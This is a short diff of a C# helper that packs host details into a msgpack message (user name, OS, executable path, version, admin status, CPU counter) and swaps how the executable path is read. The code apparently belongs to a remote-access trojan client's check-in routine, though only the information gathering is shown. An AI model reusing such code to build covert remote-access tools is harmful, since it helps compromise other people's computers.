@@ -20,7 +20,7 @@ namespace Client.Helper
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
             msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
-            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
+            msgpack.ForcePathObject("Path").AsString = Application.ExecutablePath;
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
             msgpack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
             TheCPUCounter.NextValue();
